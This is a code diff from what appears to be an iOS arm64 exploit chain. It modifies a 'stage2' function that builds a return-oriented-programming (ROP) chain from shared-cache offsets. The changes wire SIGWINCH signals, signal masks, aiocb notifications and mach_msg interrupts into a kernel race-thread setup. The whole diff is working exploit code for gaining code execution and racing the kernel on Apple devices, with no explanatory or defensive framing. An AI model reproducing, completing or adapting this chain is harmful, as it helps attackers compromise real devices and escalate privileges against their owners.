@@ -642,7 +642,12 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	snprintf(&buf,sizeof(buf),"testing...");
 	DEFINE_ROP_VAR("test_string",sizeof(buf),buf);
 
-#if 0
+#if 1
+	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
+	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
+
+	CALL("signal",SIGWINCH, offsets->rop_nop-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
+
 	uint64_t * test_break_val = malloc(8);
 	*test_break_val = 0;
 	DEFINE_ROP_VAR("test_break_val",sizeof(uint64_t),test_break_val);
@@ -651,6 +656,10 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		ROP_VAR_ARG("test_string",2);
 		CALL("write",1,0,1024,0,0,0,0,0);
 		
+		ROP_VAR_ARG_HOW_MANY(1);
+		ROP_VAR_ARG64("reply_port",5); 
+		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_MSG_TIMEOUT_NONE,0,0,0 /*recv port*/, 0, MACH_PORT_NULL,0);
+
 		// set x0 to the_one
 		SET_X0_FROM_ROP_VAR("test_break_val");
 		// break out of the loop if x0 is nonzero
@@ -760,6 +769,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),tmp);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
 
+	CALL("signal",SIGWINCH, offsets->rop_nop-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
+
 #define BARRIER_BUFFER_SIZE 0x10000
 	// spawn racer thread
 	// CALL("pthread_create",0,offsets->longjmp-0x18095c2e4+offsets->new_cache_addr /*slide it here*/,offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/,0,0,0,0,0);
@@ -784,6 +795,12 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG("thread_state",3);
 	ROP_VAR_ARG("racer_kernel_thread",5);
 	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
+
+	DEFINE_ROP_VAR("mysigmask",sizeof(uint64_t),tmp);
+	SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1)));
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("mysigmask",2);
+	CALL("__pthread_sigmask",SIG_SETMASK,0,0,0,0,0,0,0);
 	
 
 
@@ -1075,8 +1092,12 @@ _STRUCT_ARM_THREAD_STATE64
 	CALL("sigaddset",0, SIGWINCH,0,0,0,0,0,0);
 
 	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("signal_set",1);
+	ROP_VAR_ARG("signal_set",2);
 	CALL("sigprocmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);
+
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("signal_set",2);
+	CALL("__pthread_sigmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);
 
 	// TODO: we can optimize this
 	for (uint32_t i = 0; i < NENT; i++) {
@@ -1086,7 +1107,8 @@ _STRUCT_ARM_THREAD_STATE64
 		SET_ROP_VAR64_TO_VAR_W_OFFSET("aios",offset+offsetof(struct aiocb,aio_buf),"aio_buf",i);
 		SET_ROP_VAR64_W_OFFSET("aios",1,offset + offsetof(struct aiocb,aio_nbytes));
 		SET_ROP_VAR32_W_OFFSET("aios",LIO_READ,offset + offsetof(struct aiocb,aio_lio_opcode)); 
-		SET_ROP_VAR32_W_OFFSET("aios",SIGEV_NONE,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));
+		SET_ROP_VAR32_W_OFFSET("aios",SIGEV_SIGNAL,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));
+		SET_ROP_VAR32_W_OFFSET("aios",SIGWINCH,offset + offsetof(struct aiocb,aio_sigevent.sigev_signo));
 
 		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list",i*8,"aios",offset);
 	}
@@ -1100,7 +1122,7 @@ _STRUCT_ARM_THREAD_STATE64
 		
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG64("reply_port",5); 
-		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT,0,0,0 /*recv port*/, 1000, MACH_PORT_NULL,0);
+		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_MSG_TIMEOUT_NONE,0,0,0 /*recv port*/, 0, MACH_PORT_NULL,0);
 
 		// set x0 
 		SET_X0_FROM_ROP_VAR("should_race");
